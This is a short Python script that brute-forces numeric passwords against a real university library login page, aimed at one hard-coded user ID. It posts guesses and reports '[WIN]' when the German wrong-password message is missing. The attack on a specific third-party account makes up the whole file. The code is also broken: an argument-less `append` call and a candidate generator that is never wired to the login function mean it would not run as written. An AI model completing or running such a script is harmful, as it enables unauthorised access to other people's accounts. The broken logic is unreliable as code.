#! /usr/bin/env python3


import requests

target = "https://www.opac.fau.de/InfoGuideClient.uersis/login.do"
user = "02811181843"
auths = []
charlist = "0123456789"

def trial(target, user, auth):
    payload = {"username": user, "password": auth}
    resp = requests.post(target, data=payload)
    if "02811181843: Das eingegebene Kennwort ist falsch. Fehleingaben werden protokolliert" not in resp.text:
        print("[WIN]  The password is " + auth)
        return 1
    else:
        print("[FAIL] " + auth + " failed.")
        return 0

def createlist():
    alist = []
    for i in range(0,8):
        alist.append()
        work = []
        for alist[i] in range(0,10):
            work.append(charlist[alist[i]])

def main():
    createlist()

main()